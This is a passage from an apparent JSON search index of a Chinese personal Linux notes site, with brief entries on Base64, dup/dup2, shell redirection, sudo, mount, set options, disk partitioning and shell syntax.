原文的字节数量应该是3的倍数，如果这个条件不能满足的话，具体的解决办法是这样的：\n原文剩余的字节根据编码规则继续单独转(1变2，2变3；不够的位数用0补全)，再用=号补满4个字节。\n这就是为什么有些Base64编码会以一个或两个等号结束的原因，但等号最多只有两个。\n因为一个原字节至少会变成两个目标字节，所以余数任何情况下都只可能是0，1，2这三个数中的一个。\n如果余数是0的话，就表示原文字节数正好是3的倍数（最理想的情况）。\n如果是1的话，转成2个Base64编码字符，为了让Base64编码是4的倍数，就要补2个等号；\n同理，如果是2的话，就要补1个等号。 原理：三个字节的八个字符 = 四个字节的六个字符 （3*8=4*6） 流程： 1、将字符转为ascii 2、将ascii转为二进制 3、原有的三字节在这里以源一、二、三代表 转换后的第一个字节：00 + 源一的高六位字符 转换后的第二个字节：00 + 源一的低二位字符 + 源二的高四位字符 转换后的第三个字节：00 + 源二的低四位字符 + 源三的高二位字符 转换后的第四个字节：00 + 源三的低六位字符 4、转换的二进制转换为十进制，根据编码表编码 注意：转换后的编码默认每76个字符换行，若不需换行，shell中 base64 -w 0即可: base64                # 编码\nbase64 -w num         # 指定以多少个字符换行，为0则并不换行\nbase64 -d             # 解码","tags":"杂乱无章","url":"/yq-docs-Chaotic-Base64-encoding.html","loc":"/yq-docs-Chaotic-Base64-encoding.html"},{"title":"dup","text":"dup()用来复制参数oldfd 所指的文件描述词, 并将它返回.\n此新的文件描述词和参数oldfd 指的是同一个文件, 共享所有的锁定、读写位置和各项权限或旗标. 例如, 当利用lseek()对某个文件描述词作用时, 另一个文件描述词的读写位置也会随着改变.\n不过, 文件描述词之间并不共享close-on-exec 旗标. 返回值 当复制成功时, 则返回最小及尚未使用的文件描述词. 若有错误则返回-1, errno 会存放错误代码. dup与dup2 APUE和man文档都用一句话简明的说出了这两个函数的作用: 复制一个现存的文件描述符 #include <unistd.h>\nint dup(int oldfd);\nint dup2(int oldfd, int newfd);123 当调用dup函数时，内核在进程中创建一个新的文件描述符，\n此描述符是当前可用文件描述符的最小数值，这个文件描述符指向oldfd所拥有的文件表项。 dup2和dup的区别就是可以用newfd参数指定新描述符的数值， 如果newfd已经打开，则先将其关闭。 如果newfd等于oldfd，则dup2返回newfd, 而不关闭它。dup2函数返回的新文件描述符同样与参数oldfd共享同一文件表项。 APUE用另外一个种方法说明了这个问题: 实际上，调用dup(oldfd)等效于， fcntl(oldfd, F_DUPFD, 0) 而调用dup2(oldfd, newfd)等效于， close(oldfd)；fcntl(oldfd, F_DUPFD, newfd)； 注解 整理的时候发现以及不记得当初是为什么查这个了","tags":"操作系统","url":"/yq-docs-operating-system-linux-Built--in-function-dup.html","loc":"/yq-docs-operating-system-linux-Built--in-function-dup.html"},{"title":"dup2","text":"dup2()用来复制参数oldfd 所指的文件描述词, 并将它拷贝至参数newfd 后一块返回.\n若参数newfd为一已打开的文件描述词, 则newfd 所指的文件会先被关闭.\ndup2()所复制的文件描述词, 与原来的文件描述词共享各种文件状态, 详情可参考 dup 返回值 当复制成功时, 则返回最小及尚未使用的文件描述词. 若有错误则返回-1, errno 会存放错误代码.","tags":"操作系统","url":"/yq-docs-operating-system-linux-Built--in-function-dup2.html","loc":"/yq-docs-operating-system-linux-Built--in-function-dup2.html"},{"title":"getcwd","text":"获取当前目录 getcwd() failed 报错: sh: 0: getcwd() failed: No such file or directory 在一个不存在的目录上执行命令，会报上述错误， 这个目录是曾经存在，\n后来给删除了，但某些管理工具的命令还存在于这个目录下执行。会报上述错误 方法是 换目录","tags":"操作系统","url":"/yq-docs-operating-system-linux-Built--in-function-getcwd.html","loc":"/yq-docs-operating-system-linux-Built--in-function-getcwd.html"},{"title":"wait","text":"Linux内核学习笔记 - wait、waitpid、wait3 和 wait4 Linux下有四个wait函数： wait() 当进程调用wait时，会暂停目前进程的执行（即阻塞），由wait() 来自动分析是否当前进程的某个子进程已退出， 如果找到了一个已经变成变成僵尸进程的子进程，wait 就会收集这个子进程的信息，并将其彻底销毁后返回； 如果没有找到这样一个子进程，wait 就会一直阻塞在这里，直到出现僵尸进程。","tags":"操作系统","url":"/yq-docs-operating-system-linux-Built--in-function-wait.html","loc":"/yq-docs-operating-system-linux-Built--in-function-wait.html"},{"title":"颜色表与代码表","text":"颜色表 前景 背景 颜色 30 40 黑色 31 41 紅色 32 42 綠色 33 43 黃色 34 44 藍色 35 45 紫紅色 36 46 青藍色 37 47 白色 代码表 代码 意义 0 OFF 1 高亮显示 4 erline 5 闪烁 7 反白显示 8  不可见","tags":"操作系统","url":"/yq-docs-operating-system-linux-Conceptual-Color-table-and-code-table.html","loc":"/yq-docs-operating-system-linux-Conceptual-Color-table-and-code-table.html"},{"title":"重定向","text":"文件描述符 当执行shell命令时，会默认打开3个文件，每个文件有对应的文件描述符来方便我们使用 类型 文件描述符 默认情况 对应文件句柄位置 标准输入（standard input） 0 从键盘获得输入 /proc/self/fd/0 标准输出（standard output） 1 输出到屏幕（即控制台） /proc/self/fd/1 错误输出（error output） 2 输出到屏幕（即控制台） /proc/self/fd/2 所以我们平时在执行shell命令中，都默认是从键盘获得输入，\n并且将结果输出到控制台上。但是我们可以通过更改文件描述符默认的指向，\n从而实现输入输出的重定向。比如我们将1指向文件，那么标准的输出就会输出到文件中。 输出重定向 输出重定向的使用方式很简单，基本的一些命令如下: command >filename   把标准输出重定向到新文件中\ncommand 1>filename  同上\ncommand >>filename  把标准输出追加到文件中\ncommand 1>>filename 同上\ncommand 2>filename  把标准错误重定向到新文件中\ncommand 2>>filename 把标准错误追加到新文件中 我们使用>或者>>对输出进行重定向。 符号的左边表示文件描述符，如果没有的话表示1，也就是标准输出， 符号的右边可以是一个文件，也可以是一个输出设备。 当使用>时，会判断右边的文件存不存在，\n如果存在的话就先删除，然后创建一个新的文件，\n不存在的话则直接创建。\n但是当使用>>进行追加时，则不会删除原来已经存在的文件。 （这里>的创建只能创建在已经存在的目录下，目录不存在则报错） 输入重定向 在理解了输出重定向之后，理解输入重定向就会容易得多。对输入重定向的基本命令如下: command <filename    以filename文件作为标准输入\ncommand 0<filename   同上\ncommand <<delimiter  从标准输入中读入，直到遇到delimiter分隔符\ncommand <<<delimiter 从标准输入中读入变量 我们使用<对输入做重定向，如果符号左边没有写值，那么默认就是0。 重定向顺序 command >log.txt 2>&1 将标准输出, 错误输出都输出到一个文件: command >log.txt 2>&1 理解的话可以按照顺序看, 先: >log.txt 此处省略了1, 即: 1>log.txt 表示把标准输出重定向到 log.txt, 后面的: 2>&1 表示把标准错误重定向到标准输出. command &>log.txt 官方提供了一个特殊的: command &>log.txt 与上面含义一致, 表示把标准错误重定向到标准输出.","tags":"操作系统","url":"/yq-docs-operating-system-linux-Conceptual-Redirect.html","loc":"/yq-docs-operating-system-linux-Conceptual-Redirect.html"},{"title":"特殊的权限位","text":"Set-User-ID(SUID)位 s 或 S 替换用户的 x Set-Group-ID(SGID)位 s 或 S 替换组的 x 粘滞位 t 或 T 替代其他用户的 x","tags":"操作系统","url":"/yq-docs-operating-system-linux-Conceptual-Special-permissions.html","loc":"/yq-docs-operating-system-linux-Conceptual-Special-permissions.html"},{"title":"制表符","text":"参考: https://www.zhihu.com/question/19773623/answer/176124901 水平制表符（ \\t ） 相信大家对 \\t 还是比较熟悉的。\n一般来说，其在终端和文件中的输出显示相当于按下键盘TAB键效果。\n一般系统中，显示水平制表符将占8列。\n同时水平制表符开始占据的初始位 置是第8*n列（第一列的下标为0）。\n例如: puts(\"0123456\\txx\"); 垂直制表符（ \\v ） 垂直制表符不常用。\n它的作用是让 \\v 后面的字符从下一行开始输出，\n且开始的列数为 \\v 前一个字符所在列后面一列。\n例如: puts(\"01\\v2345\") 但是竖直制表符在命令提示符中显示不出来，\n只会显示一个框（可能是因为竖直制表符是打印的时候用的？）","tags":"操作系统","url":"/yq-docs-operating-system-linux-Conceptual-Tabs.html","loc":"/yq-docs-operating-system-linux-Conceptual-Tabs.html"},{"title":"/etc/hosts","text":"查看本地域名与地址映射, 内容为 地址与域名的映射, 例如, /etc/hosts 看起来如下: 127.0.0.1 localhost\n127.0.1.1 host_name\n\n### The following lines are desirable for IPv6 capable hosts\n::1     localhost ip6-localhost ip6-loopback\nff02::1 ip6-allnodes\nff02::2 ip6-allrouters 每一行由 IP 地址 开始，接下来是相关联的 主机名 . host_name 匹配在 /etc/hostname 里定义的主机名。 对于有永久 IP 地址的系统，这个永久 IP 地址应当代替这里的 127.0.1.1 。 对于有永久 IP 地址和有 域名系统 Domain Name System (DNS) 提供 完全资格域名 fully qualified domain name (FQDN) 的系统，规范名 host_name.domain_name 应当被用来代替 host_name .","tags":"操作系统","url":"/yq-docs-operating-system-linux-Configuration-file-ETC-HOSTS.html","loc":"/yq-docs-operating-system-linux-Configuration-file-ETC-HOSTS.html"},{"title":"/etc/resolv.conf","text":"配置本机使用dns服务器, 以nameserver开头, 可多行. 如果 resolvconf 软件包没有安装， /etc/resolv.conf 是一个静态文件。\n如果安装了，它是一个符号链接。\n此外，它包含有解析策略的初始化信息。如 DNS 是 IP= 192.168.11.1 ,则包含如下: nameserver 192.168.11.1 resolvconf 软件包使这个 /etc/resolv.conf 文件成为一个符号链接，并通过钩子脚本自动管理其内容。 注解 见: resolvconf","tags":"操作系统","url":"/yq-docs-operating-system-linux-Configuration-file-ETC-Resolv-CONF.html","loc":"/yq-docs-operating-system-linux-Configuration-file-ETC-Resolv-CONF.html"},{"title":"PS1","text":"参考 PS1 提示符定义","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-environment-variable-PS1.html","loc":"/yq-docs-operating-system-linux-Linux-environment-variable-PS1.html"},{"title":"TMPDIR","text":"应用程序一般在临时存储目录 /tmp 下建立临时文件。\n如果 /tmp 没有足够的空间，\n可以通过 $TMPDIR 变量来为程序指定临时存储目录。","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-environment-variable-TMPDIR.html","loc":"/yq-docs-operating-system-linux-Linux-environment-variable-TMPDIR.html"},{"title":"at","text":"","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-AT.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-AT.html"},{"title":"lsmod","text":"内核模块可见: 内核模块","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-LSMOD.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-LSMOD.html"},{"title":"od","text":"","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-OD.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-OD.html"},{"title":"resolvconf","text":"注解 这是一个软件包, 不确定有没有指令 与 /etc/resolv.conf 相关, 配置域名解析服务地址 如果 resolvconf 软件包没有安装， /etc/resolv.conf 是一个静态文件。\n如果安装了，它是一个符号链接.\n此外，它包含有解析策略的初始化信息。如 DNS 是 IP=\" 192.168.11.1 \",则包含如下: nameserver 192.168.11.1 resolvconf 软件包使这个 /etc/resolv.conf 文件成为一个符号链接，\n并通过钩子脚本自动管理其内容。","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-Resolvconf.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-Resolvconf.html"},{"title":"sudo","text":"以系统管理者的身份执行指令 sudo 程序是为了使一个系统管理员可以给用户受限的 root 权限并记录 root 活动而设计的。 sudo 只需要一个普通用户的密码。\n安装 sudo 软件包并通过设置 /etc/sudoers 中的选项来使用它 选项参数 -V 显示版本编号 -h 会显示版本编号及指令的使用方式说明 -l 显示出自己（执行 sudo 的使用者）的权限 -L 显示sudo设置 -v 因为 sudo 在第一次执行时或是在 N 分钟内没有执行（N 预设为五）会问密码，这个参数是重新做一次确认，如果超过 N 分钟，也会问密码 -k 将会强迫使用者在下一次执行 sudo 时问密码（不论有没有超过 N 分钟） -b 将要执行的指令放在背景执行 -p prompt 可以更改问密码的提示语，其中 %u 会代换为使用者的帐号名称， %h 会显示主机名称 -u username/#uid 不加此参数，代表要以 root 的身份执行指令，而加了此参数，可以以 username 的身份执行指令（#uid 为该 username 的使用者号码） -s 执行环境变数中的 SHELL 所指定的 shell ，或是 /etc/passwd 里所指定的 shell -H 将环境变数中的 HOME （家目录）指定为要变更身份的使用者家目录（如不加 -u 参数就是系统管理者 root ） -i 切换到root用户, 并加载root的环境变量(需要输入当前用户的密码) 直接加 command 既可以系统管理者身份（或以 -u 更改为其他人）执行该 command 技巧 以root权限执行上一条命令: sudo !! 配置 可以在 /etc/sudoers 配置可使用sudo的用户: # /etc/sudoers\nALL    ALL=(ALL:ALL) ALL\n\n# ALL        ALL=(ALL:ALL)         ALL\n# username    host=(user:group)    cmd 多个cmd规则以逗号分隔\n#             也可以仅写一个       设置免密，NOPASSWD:cmd\n#                                设置禁止, !cmd\n\n\n# The first ALL is the users allowed,    + % is group\n# The second one is the hosts\n# The third one is the user as you are running the command （root:root）user:group\n# The last one is the commands allowed\n\n# ALL 表示任何身份、主机、指令","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-SUDO.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-SUDO.html"},{"title":"chgrp","text":"用于文件的所有者或 root 账户修改文件所属的组: chgrp *newgroup* foo","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-chGRP.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-chGRP.html"},{"title":"chmod","text":"用于文件的所有者或 root 账户修改文件和文件夹的访问权限: chmod  [ugoa][+-=][rwxXst][,...] foo","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-chmod.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-chmod.html"},{"title":"getfacle","text":"查看acl权限: getfacle $filename 例: [root@localhost /]# getfacl project\n#查看/prpject目录的ACL权限\n#file: project <-文件名\n#owner: root <-文件的属主\n#group: tgroup <-文件的属组\nuser::rwx <-用户名栏是空的，说明是属主的权限\nuser:st:r-x <-用户st的权限\ngroup::rwx <-组名栏是空的，说明是属组的权限\nmask::rwx <-mask权限\nother::--- <-其他人的权限 关于ACL权限参考: ACL权限控制","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-getfal.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-getfal.html"},{"title":"insmod","text":"内核模块可见: 内核模块","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-insmod.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-insmod.html"},{"title":"mount","text":"相关指令: umount mount命令 功能：文件挂载 格式: mount [-参数] [设备名称] [挂载点] 常用选项： -a 安装在/etc/fstab文件中类出的所有文件系统。 -f 伪装mount，作出检查设备和目录的样子，但并不真正挂载文件系统。 -n 不把安装记录在/etc/mtab 文件中。 -r 将文件系统安装为只读。 -v 详细显示安装信息。 -w 将文件系统安装为可写，为命令默认情况。 -t <文件系统类型> 指定设备的文件系统类型，常见的有： ext2 是linux目前常用的文件系统\nmsdos MS-DOS的fat，就是fat16\nvfat windows98常用的fat32\nnfs 网络文件系统\niso9660 CD-ROM光盘标准文件系统\nntfs windows NT/2000/XP的文件系统\nauto 自动检测文件系统 -o <选项> 指定挂载文件系统时的选项，有些也可写到在 /etc/fstab 中。常用的有： defaults 使用所有选项的默认值（auto、nouser、rw、suid）\nauto/noauto 允许/不允许以 –a选项进行安装\ndev/nodev 对/不对文件系统上的特殊设备进行解释\nexec/noexec 允许/不允许执行二进制代码\nsuid/nosuid 确认/不确认suid和sgid位\nuser/nouser 允许/不允许一般用户挂载\ncodepage=XXX 代码页\niocharset=XXX 字符集\nro 以只读方式挂载\nrw 以读写方式挂载\nremount 重新安装已经安装了的文件系统\nloop 挂载\"回旋设备\"以及\"ISO镜像文件\" --bind <dir1 dir2> 命令来将两个目录连接起来， mount --bind 命令是将前一个目录挂载到后一个目录上， 所有对后一个目录的访问其实都是对前一个目录的访问 关于 --bind mount --bind test1 test2 为例，\n当 mount --bind 命令执行后，Linux将会把被挂载目录的目录项（也就是该目录文件的block，记录了下级目录的信息）屏蔽，\n即test2的下级路径被隐藏起来了（注意，只是隐藏不是删除，数据都没有改变，只是访问不到了）。\n同时，内核将挂载目录 test1 的目录项记录在内存里的一个s_root对象里，\n在mount命令执行时，VFS会创建一个vfsmount对象，这个对象里包含了整个文件系统所有的mount信息，\n其中也会包括本次mount中的信息，这个对象是一个HASH值对应表（HASH值通过对路径字符串的计算得来），\n表里就有 /test1 到 /test2 两个目录的HASH值对应关系。 命令执行完后，当访问 /test2下的文件时， 系统会告知 /test2 的目录项被屏蔽掉了，\n自动转到内存里找VFS，通过 vfsmount 了解到 /test2 和 /test1 的对应关系，\n从而读取到 /test1 的inode，这样在 /test2 下读到的全是 /test1 目录下的文件。 mount --bind连接的两个目录的inode号码并不一样，\n只是被挂载目录的block被屏蔽掉，inode被重定向到挂载目录的inode（被挂载目录的inode和block依然没变）。 两个目录的对应关系存在于内存里，一旦重启挂载关系就不存在了。 在固件开发过程中常常遇到这样的情况：为测试某个新功能，必需修改某个系统文件。\n而这个文件在只读文件系统上（总不能为一个小小的测试就重刷固件吧），\n或者是虽然文件可写，但是自己对这个改动没有把握，不愿意直接修改。这时候 mount --bind 就是你的好帮手。 假设我们要改的文件是/etc/hosts，可按下面的步骤操作: 把新的hosts文件放在/tmp下。 当然也可放在硬盘或U盘上。 mount --bind /tmp/hosts /etc/hosts , 此时的/etc目录是可写的，所做修改不会应用到原来的/etc目录，\n可以放心测试。测试完成了执行 umount /etc/hosts 断开绑定(可参考: umount ) 例如: ## test1 test2为两个不同的目录\nlinux-UMLhEm:/home/test/linux # ls test1\n11.test  1.test\nlinux-UMLhEm:/home/test/linux # ls test2\n22.test  2.test\nlinux-UMLhEm:/home/test/linux # ls -lid test1\n1441802 drwx------ 2 root root 4096 Feb 13 09:50 test1\nlinux-UMLhEm:/home/test/linux # ls -lid test2\n1441803 drwx------ 2 root root 4096 Feb 13 09:51 test2\n\n## 执行mount --bind 将test1挂载到test2上，inode号都变为test1的inode\nlinux-UMLhEm:/home/test/linux # mount --bind test1 test2\nlinux-UMLhEm:/home/test/linux # ls -lid test1\n1441802 drwx------ 2 root root 4096 Feb 13 09:50 test1\nlinux-UMLhEm:/home/test/linux # ls -lid test2\n1441802 drwx------ 2 root root 4096 Feb 13 09:50 test2\nlinux-UMLhEm:/home/test/linux # ls test2\n11.test  1.test 参考: mount --bind使用方法 扩展可用存储空间 方案1: 使用 --bind 如果你在另一个分区里有一个带有可用空间的空目录（例如 /path/to/emp-dir ），\n你可以通过带有 \" --bind \" 选项的 mount ，\n将它挂载到一个你需要更多空间的目录（例如 work-dir ）: $ sudo mount --bind /path/to/emp-dir work-dir 注解 这个只是相当于用 /path/to/emp-dir 暂时将 work-dir 屏蔽,\n信息保存与内存中, 只建议测试使用 方案2: 使用 -t overlay 通过 overlay 挂载（overlay-mounting）另一个目录来扩展可用存储空间 如果你在另一个分区表中有可用的空间（例如， /path/to/empty 和 /path/to/work ），\n你可以在其中建立一个目录并堆栈到你需要空间的那个旧的目录（例如， /path/to/old ），\n要这样做，你需要用于 Linux 3.18 版内核或更新版本（对应 Debian Stetch 9.0 或更新版本）\n的 OverlayFS $ sudo mount -t overlay overlay \\\n  -olowerdir=/path/to/old-dir,upperdir=/path/to/empty,workdir=/path/to/work /path/to/empty 和 /path/to/work 应该位于可读写的分区，从而能够写入 /path/to/old","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-mount.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-mount.html"},{"title":"rmmod","text":"参数： -f 强制将该模组移除掉，不论是否正被使用； -w 若该模组正被使用，则 rmmod 会等待该模组被使用完毕后，才移除他！ 内核模块可见: 内核模块","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-rmmod.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-rmmod.html"},{"title":"set","text":"set命令用于设置显示当前shell的变量。 set指令能设置所使用shell的执行方式，可依照不同的需求来做设置。 语法: set [+-abCdefhHklmnpPtuvx] 若不加任何参数, 会 显示当前的环境变量和位置参数 .\n这时候于env区别可见: env 常用: # set\n-e                #若指令传回值不等于0，则立即退出\n+e                #关闭上面那个，让原脚本继续执行 一般配套使用\n-- <args>         #设置参数 如 set -- h1 h2 ;echo $@,$#\n                  #h1 h2,2 选项参数 -a 标示已修改的变量，以供输出至环境变量。 -b 使被中止的后台程序立刻回报执行状态。 -C 转向所产生的文件无法覆盖已存在的文件。 -d Shell预设会用杂凑表记忆使用过的指令，以加速指令的执行。使用-d参数可取消。 -e 若指令传回值不等于0，则立即退出shell。 -f 取消使用通配符。 -h 自动记录函数的所在位置。 -H <Shell> 可利用\"!\"加<指令编号>的方式来执行history中记录的指令。 -k 指令所给的参数都会被视为此指令的环境变量。 -l 记录for循环的变量名称。 -m 使用监视模式。 -n 只读取指令，而不实际执行。 -p 启动优先顺序模式。 -P 启动-P参数后，执行指令时，会以实际的文件或目录来取代符号连接。 -t 执行完随后的指令，即退出shell。 -u 当执行时使用到未定义过的变量，则显示错误信息, 可以与-e一起使用 -v 显示shell所读取的输入值。 -x 执行指令后，会先显示该指令及所下的参数。 -g x 设置全局变量 -s x 设置本地变量 其他: +<参数>     取消某个set曾启动的参数。 一些用途 set 指令在Shell脚本中有多种作用，以下是一些常见的用法: 设置位置参数：使用 set 命令可以将一个或多个值设置为脚本的位置参数。\n例如：set foo bar 会将 foo 和 bar 分别设置为 $1 和 $2。 显示和修改Shell选项：使用 set -<option> 命令可以启用或禁用特定的Shell选项。\n例如，set -e 启用了脚本的异常终止（错误即退出）选项。 显示和修改变量：使用 set 命令可以显示当前设置的变量。\n例如，set 会显示所有的环境变量和用户定义的变量。可以使用 set <variable>=<value> 来修改或创建新的变量。 展开变量：使用 set -x 命令可以打开脚本的调试模式，从而在运行脚本时输出每个命令的展开结果。 处理命令行选项：使用 set -- <args> 可以将指定的参数设置为脚本的位置参数，这样就可以像处理命令行选项一样访问和处理这些参数。 配置特殊字符：使用 set 命令可以更改Shell的特殊字符处理方式。\n例如，使用 set -f 可以禁用文件名扩展。 注解 set 命令的具体行为可能会因不同的Shell和环境而有所不同。\n可以使用 help set 或查阅相关文档来获取更详细的信息 在 shell 中执行 set -x 或使用 -x 选项启动 shell\n可以让 shell 显示出所有执行的命令.\n对调试来说是非常方便的","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-set.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-set.html"},{"title":"setfacle","text":"设置acl权限: setfacle 选项 文件名 选项 -m 设定 ACL 权限。 如果是给予用户 ACL 权限，则使用\"u:用户名：权限\"格式赋予； 如果是给予组 ACL 权限，则使用\"g:组名：权限\" 格式赋予； -x 删除指定的 ACL 权限； -b 删除所有的 ACL 权限； -d 设定默认 ACL 权限。只对目录生效，指目录中新建立的文件拥有此默认权限； -k 删除默认 ACL 权限； -R 递归设定 ACL 权限。指设定的 ACL 权限会对目录下的所有子文件生效； 关于ACL权限参考: ACL权限控制","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-setfal.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-setfal.html"},{"title":"wall","text":"","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-wall.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-wall.html"},{"title":"硬盘分区配置","text":"对于 硬盘分区 配置，\n尽管 fdisk 被认为是标准的配置，\n但是 parted 工具还是值得注意的 老的 PC 使用经典的 主引导记录（Master Boot Record，MBR） 方案，\n将 硬盘分区 数据保存在第一个扇区，即 LBA 扇区 0（512 字节）。 一些带有 可扩展固件接口（Unified Extensible Firmware Interface，UEFI） 的近代 PC，包括基于 Intel 的 Mac，使用 全局唯一标识分区表（GUID Partition Table，GPT） 方案， 硬盘分区 数据不保存在第一个扇区。 尽管 fdisk 一直是硬盘分区的标准工具，\n但现在 parted 替代了它。 LVM2 LVM2 是一个用于 Linux 内核的 逻辑卷管理器 .\n使用 LVM2 的话，硬盘分区可以创建在逻辑卷上来替代物理硬盘。 LVM 有下列需求 Linux 内核中的设备映射支持（Debian 内核默认支持） 用户自定义设备映射支持库（ libdevmapper* 软件包） 用户自定义 LVM2 工具（ lvm2 软件包） 通过 $TMPDIR 指定临时存储目录 见: TMPDIR 挂载另一个分区来扩展可用存储空间 如果你有一个空的分区（例如 /dev/sdx ），\n你可以使用 mkfs.ext4 将它格式化，\n并使用 mount 将它挂载到你需要更多空间的目录。（你需要复制原始数据内容。）: $ sudo mv work-dir old-dir\n$ sudo mkfs.ext4 /dev/sdx\n$ sudo mount -t ext4 /dev/sdx work-dir\n$ sudo cp -a old-dir/* work-dir\n$ sudo rm -rf old-dir 注解 你也可以选择挂载一个空硬盘映像文件\n（参见 第 9.7.5 节 \"制作空的磁盘映像文件\" ）\n作为一个循环设备\n（参见 第 9.7.3 节 \"挂载磁盘映像文件\" )。\n实际的硬盘使用量会随着实际存储数据的增加而增加 关于扩展可用存储空间可见: Disk-Partition-mount","tags":"操作系统","url":"/yq-docs-operating-system-linux-Tutorial-Hard-disk-partition-configuration.html","loc":"/yq-docs-operating-system-linux-Tutorial-Hard-disk-partition-configuration.html"},{"title":"文件读取","text":"while read line 重定向: while read line\n\ndo\n\n    …\n\ndone < file read通过输入重定向，把file的第一行所有的内容赋值给变量line，\n循环体内的命令一般包含对变量line的处理；\n然后循环处理file的第二行、第三行。。。一直到file的最后一行。\n还记得while根据其后的命令退出状态来判断是否执行循环体吗？\n是的，read命令也有退出状态，当它从文件file中读到内容时，退出状态为0，循环继续进行；\n当read从文件中读完最后一行后，下次便没有内容可读了，此时read的退出状态为非0，所以循环才会退出。 使用管道: command | while read line\n\ndo\n\n  …\n\ndone","tags":"操作系统","url":"/yq-docs-operating-system-linux-Tutorial-shell-grammar-specification-File-reading.html","loc":"/yq-docs-operating-system-linux-Tutorial-shell-grammar-specification-File-reading.html"},{"title":"Shell的return","text":"shell的return 今天写bug发现shell的return与之前java的不一样 return其实与exit基本一致    不一致的地方在于函数内return只是退出函数，exit退出脚本 返回的值只能为0-255的数字 判断时可用，而不能传递字符串之类的 操作字符串只能用全局变量了（或者echo）","tags":"操作系统","url":"/yq-docs-operating-system-linux-Tutorial-shell-grammar-specification-Shell's-Return.html","loc":"/yq-docs-operating-system-linux-Tutorial-shell-grammar-specification-Shell's-Return.html"},{"title":"Shell循环","text":"跳出循环 continue 与 break 后面跟 n 表示退出几层循坏","tags":"操作系统","url":"/yq-docs-operating-system-linux-Tutorial-shell-grammar-specification-Shell-cycle.html","loc":"/yq-docs-operating-system-linux-Tutorial-shell-grammar-specification-Shell-cycle.html"},{"title":"Shell传递参数","text":"主要是Shell传递命令行参数 特殊的 shell 参数经常在 shell 脚本里面被用到: shell 参数      值\n$0                    shell 或 shell 脚本的名称\n$1                    第一个 shell 参数\n$9                    第 9 个 shell 参数\n$###                  位置参数数量\n\"$*\"          \"$1 $2 $3 $4 … \"\n\"$@\"          \"$1\" \"$2\" \"$3\" \"$4\" …\n$?                    最近一次命令的退出状态码\n$$                    这个 shell 脚本的 PID\n$!                    最近开始的后台任务 PID Shell参数展开列表 参数表达式形式         如果 var 变量已设置那么值为        如果 var 变量没有被设置那么值为: ${var:-string}        \"$var\"                                          \"string\"\n${var:+string}        \"string\"                                        \"null\"\n${var:=string}        \"$var\"                                          \"string\" (并运行 \"var=string\")\n${var:?string}        \"$var\"                                          在 stderr 中显示 \"string\" (出错退出) 详见: shell的变量替换 重要的Shell参数替换列表 参数替换形式与结果: ${var%suffix}     删除位于 var 结尾的 suffix 最小匹配模式\n${var%%suffix}    删除位于 var 结尾的 suffix 最大匹配模式\n${var###prefix}   删除位于 var 开头的 prefix 最小匹配模式\n${var####prefix}  删除位于 var 开头的 prefix 最大匹配模式 详见: shell的变量替换","tags":"操作系统","url":"/yq-docs-operating-system-linux-Tutorial-shell-grammar-specification-Shell-pass-parameter.html","loc":"/yq-docs-operating-system-linux-Tutorial-shell-grammar-specification-Shell-pass-parameter.html"},{"title":"bash数组","text":"定义数组: arr=(a b c d)\n\n${arr[@]}\n#和\n${arr[*]}\n#相同，都是返回整个数组，包括四个元素。 通过中括号及下标获取其中的某一个元素: ${arr[0]}\n#得到 a (第一个元素)，\n${arr[1]}\n#第二个... 使用井号（#）计算数组的长度: ${#arr[@]}\n#或\n${#arr[*]}\n#4 （使用井号计算长度时，若参数为字符串则返回字符串的长度，若参数为数组则返回数组中元素的个数。）","tags":"操作系统","url":"/yq-docs-operating-system-linux-Tutorial-shell-grammar-specification-bash-array.html","loc":"/yq-docs-operating-system-linux-Tutorial-shell-grammar-specification-bash-array.html"},{"title":"单/双引号","text":"单引号 所见即所得，输入什么就是什么。 即将单引号内的内容原样输出，或者描述为单引号里面看到的是什么就会输出什么。 双引号 解析特殊符号（命令啥的），不支持通配符解析。 把双引号内的内容输出出来；如果内容中有命令、变量等，会先把变量、命令解析出结果，然后在输出最终内容来。 不加引号 特殊符号，通配符全部解析。 不会将含有空格的字符串视为一个整体输出, 如果内容中有命令、变量等，会先把变量、命令解析出结果，然后在输出最终内容来; 如果字符串中带有空格等特殊字符，则不能完整的输出，需要改加双引号，一般连续的字符串，数字，路径等可以用。","tags":"操作系统","url":"/yq-docs-operating-system-linux-Tutorial-shell-grammar-specification-quotation-marks.html","loc":"/yq-docs-operating-system-linux-Tutorial-shell-grammar-specification-quotation-marks.html"},{"title":"快捷键","text":"ctrl 组合键 ctrl + c    终止目前的命令 ctrl + d    输入结束（EOF），例如邮件结束的时候 ctrl + M    enter ctrl + s    暂停屏幕输出 ctrl + q    恢复屏幕输出 ctrl + u    在提示字符下，将整列命令删除 ctrl + z    暂停 目前的命令 当输入一串指令时，发现前面写的一串数据是错的，\n想要删除游标所在处到最前面的指令内容，应该如何处理: ctrl + 